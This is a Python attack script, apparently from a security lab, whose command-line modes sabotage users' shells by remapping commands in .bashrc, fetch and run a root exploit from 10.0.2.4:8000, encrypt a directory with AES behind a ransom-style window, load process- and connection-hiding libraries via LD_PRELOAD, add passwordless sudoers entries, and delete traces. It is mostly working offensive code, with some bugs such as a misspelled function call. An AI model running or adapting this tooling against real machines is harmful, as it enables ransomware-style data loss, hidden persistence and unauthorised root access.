import os
import subprocess
import time
import sys
import hashlib
import base64
import cryptography.fernet as fernet
import tkinter as tk
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def create_shuffle_file():
    bash_script = """
    #!/bin/bash
    # File to modify
    BASHRC="$HOME/.bashrc"
    # List of commands to shuffle
    commands=("ls" "cat" "grep" "find" "head" "tail" "sort" "wc" "who" "date")
    echo "Commands to shuffle: ${commands[*]}"
    # Unalias commands if they are aliased
    for cmd in "${commands[@]}"; do    
        unalias $cmd
    done
    # Shuffle the commands
    shuffled_commands=($(shuf -e "${commands[@]}"))
    echo "Shuffled commands: ${shuffled_commands[*]}"
    # Assign each command a new functionality
    for i in $(seq 0 $((${#commands[@]} - 1))); do
        original_command=${commands[$i]}    
        new_command=${shuffled_commands[$i]}
        echo "Assigning new functionality: $original_command -> $new_command"
        # Check if the new command is a builtin
        if type "$new_command" | grep -q "builtin"; then
            echo "function $original_command() { builtin $new_command \"\$@\"; }" >> $BASHRC
        else
            echo "function $original_command() { /bin/$new_command \"\$@\"; }" >> $BASHRC
        fi
    done
    echo "Command shuffle completed. Please restart your shell."
    """

    file_path = '/tmp/shuffle.sh'  # Replace with your desired file path

    with open(file_path, 'w') as file:
        file.write(bash_script)


def run_shuffler():
    subprocess.run(["sudo", "./tmp/shuffle.sh"])


def append_to_bashrc(line_to_append):
    bashrc_path = os.path.expanduser('~/.bashrc')
    try:
        with open(bashrc_path, 'a') as bashrc_file:
            bashrc_file.write("\n" + line_to_append + "\n")
    except Exception as e:
        print(f"Error: {e}")


def get_root():
    subprocess.run(["wget", "10.0.2.4:8000/exploit"])
    subprocess.run(["./exploit"])
    print("got root")


def key_from_string(input_string):
    # Hash the input string to get a fixed-size byte array
    key_hash = hashlib.sha256(input_string.encode()).digest()

    # Use base64 encoding to format the hash as a Fernet-compatible key
    key = base64.urlsafe_b64encode(key_hash)
    return key[0:16]
    

# def encrypt_dir(d, password):
#     for root, dirs, files in os.walk(d):
#         for file in files:
#             file_path = os.path.join(root, file)

#             # Read the file into a byte stream
#             with open(file_path, 'rb') as file_obj:
#                 byte_content = file_obj.read()

#             key = key_from_string(password)
#             f = fernet(key)

#             encrypted_message = f.encrypt(byte_content)

#             # Now, rewrite the same byte content back to the file
#             with open(file_path, 'wb') as file_obj:
#                 file_obj.write(encrypted_message)
            
#             print(f"Processed file: {file_path}")


def encrypt_dir(d, password):
    key = key_from_string(password)
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv

    for root, dirs, files in os.walk(d):
        for file in files:
            file_path = os.path.join(root, file)

            # Read the file into a byte stream
            with open(file_path, 'rb') as file_obj:
                byte_content = file_obj.read()

            padding_length = AES.block_size - len(byte_content) % AES.block_size
            padding = padding_length.to_bytes(1,'big') * padding_length
            padded = byte_content + padding
            
            # key = key_from_string(password)

            # cipher = AES.new(key, AES.MODE_CBC)
            # iv = cipher.iv
            encrypted_message = cipher.encrypt(padded)

            # Now, rewrite the same byte content back to the file
            with open(file_path, 'wb') as file_obj:
                file_obj.write(iv)
                file_obj.write(encrypted_message)
            
            print(f"Processed file: {file_path}")
    return key


# def decrypt(dec_dir, my_hash):
#     for root, dirs, files in os.walk(dec_dir):
#         for file in files:
#             file_path = os.path.join(root, file)

#             # Read the file into a byte stream
#             with open(file_path, 'rb') as file_obj:
#                 byte_content = file_obj.read()

#             f = fernet(my_hash)

#             decrypted_message = f.decrypt(byte_content)

#             # Now, rewrite the same byte content back to the file
#             with open(file_path, 'wb') as file_obj:
#                 file_obj.write(decrypted_message)

#             print(f"Processed file: {file_path}")


def decrypt(dec_dir, my_hash):
    for root, dirs, files in os.walk(dec_dir):
        for file in files:
            file_path = os.path.join(root, file)

            # Read the file into a byte stream
            with open(file_path, 'rb') as file_obj:
                iv = file_obj.read(16)
                cipher_text = file_obj.read()

            cipher = AES.new(my_hash, AES.MODE_CBC, iv)
            dec_text = cipher.decrypt(cipher_text)
            plaintext = dec_text[:-ord(dec_text[len(dec_text)-1:])]

            # Now, rewrite the same byte content back to the file
            with open(file_path, 'wb') as file_obj:
                file_obj.write(plaintext)

            print(f"Processed file: {file_path}")



def display_image_with_message(im_path, enc_dir, key_hash):
    # Create a Tkinter window
    root = tk.Tk()
    root.title("Display Image")

    # Load the image
    img = tk.PhotoImage(file=im_path)

    # Create a label to display the image
    label = tk.Label(root, image=img)
    label.image = img  # Keep a reference!
    label.pack()

    message = enc_dir + " has been encrypted, ask me for the key if you can't guess it hehe"

    # Create a label for the message
    message_label = tk.Label(root, text=message, font=("Arial", 16))
    message_label.pack()

    # Entry field for user input
    input_field = tk.Entry(root)
    input_field.pack()

    # Function to handle button click
    def on_button_click(hashed_key, di):
        global user_input_value
        user_input_value = input_field.get()
        print(f"User input: {user_input_value}")
        curr_hash = key_from_string(user_input_value)
        if hashed_key == curr_hash:
            decrypt(di, key_hash)
            root.destroy()  # Closes the window only if condition is met

    # Button to submit input
    submit_button = tk.Button(root, text="Submit", command=lambda: on_button_click(key_hash, enc_dir))
    submit_button.pack()

    # Run the GUI loop
    root.mainloop()


def inform_encryption(d, my_hashed_key):
    print("the directory ", d, " has been encrypted")
    # Get key, make comparison with hash of key, if correct decrypt,
    display_image_with_message("~/Desktop/giphy.gif", d, my_hashed_key)
    return


def prove_root():
    print("proving root by opening /etc/sudoers for editing")
    subprocess.run(["sudo", "vi", "/etc/sudoers"])


def append_to_bashrc(line_to_append):
    bashrc_path = os.path.expanduser('/etc/bash.bashrc')
    try:
        with open(bashrc_path, 'a') as bashrc_file:
            bashrc_file.write("\n" + line_to_append + "\n")
    except Exception as e:
        print(f"Error: {e}")


def create_user(username):
    command = f"sudo adduser --no-create-home {username}"
    command2 = f"sudo passwd {username}"
    result = subprocess.run(command, shell=True)
    if result.returncode == 0:
        print(f"User '{username}' created successfullt.")
        # subprocess.run(command2, shell=True)
    else:
        print(f"Failed to create user '{username}'.") 


def add_usr_to_sudoers(username):
    command = f"echo '{username} ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers"
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("STDOUT:", result.stdout.decode())
    print("STDERR:", result.stderr.decode())

def clean_up():
    # Delete the specified directory
    command = "rm -rf /tmp/notverysusciousfilecontainingnogayporn"
    subprocess.run(command, shell=True, check=True)

    # Function to remove lines containing 'export LD_PRELOAD' from a file
    def remove_ld_preload_line(file_path):
        try:
            # Read the contents of the file
            with open(file_path, 'r') as file:
                lines = file.readlines()

            # Write back all lines that don't contain 'export LD_PRELOAD'
            with open(file_path, 'w') as file:
                for line in lines:
                    if 'export LD_PRELOAD' not in line:
                        file.write(line)

        except IOError as e:
            print(f"An error occurred while processing {file_path}: {e}")

    # List of files to process
    files_to_process = ["/etc/bash.bashrc", "kolokasi/.bashrc"]

    # Process each file
    for file_path in files_to_process:
        remove_ld_preload_line(file_path)



if __name__ == "__main__":
    argc = len(sys.argv)
    argv = sys.argv
    if argc == 1:
        print("specify attack")
    elif argc >= 2:
        if argv[1] == "shuffle":
            create_shuffle_file()
            run_shuffler()
        if argv[1] == "append":
            not_suspicious_dir = "/tmp/notverysusciousfilecontainingnogayporn"
            library_pid1_path = os.path.join(not_suspicious_dir, "library_pid1.so")
            library_tcp_hider_path = os.path.join(not_suspicious_dir, "library_tcp_hider.so")
            preload_command = f"export LD_PRELOAD={library_pid1_path}:{library_tcp_hider_path}"
            append_to_bashrc(preload_command)
        if argv[1] == "clean":
            clean_up()
        if argv[1] == "encrypt":
            if argc != 3:
                print("specify dir")
            if argc != 4:
                dir_f = argv[2]
                print("specify password")
                pss = input("here: ")
                k = encrypt_dir(dir_f, pss)
                inform_encryption(dir_f, k)  
            else:
                dir_f = argv[2]
                pss = argv[3]
                k = encrypt_dir(dir_f, pss)
                inform_encryption(dir_f, k)

        if argv[1] == "decrypt":
            if argc != 3:
                print("specify dir")
            if argc != 4:
                dir_f = argv[2]
                print("specify password")
                pss = input("here: ")
                h = key_from_string(pss)
                decrpyt(dir_f, pss)
            else:
                dir_f = argv[2]
                pss = argv[3]
                h = key_from_string(pss)
                decrypt(dir_f, pss)

        if argv[1] == "prove":
            prove_root()

        if argv[1] == "addMe":
            if argc <= 3:
                print("what username?")
            else:
                if argv[2] == "-new":
                    usrname = argv[3]
                    create_user(usrname)
                    add_usr_to_sudoers(usrname)
                else:
                    usr = argv[2]
                    add_usr_to_sudoers(usr)
                print("congrats your user is in root")
                
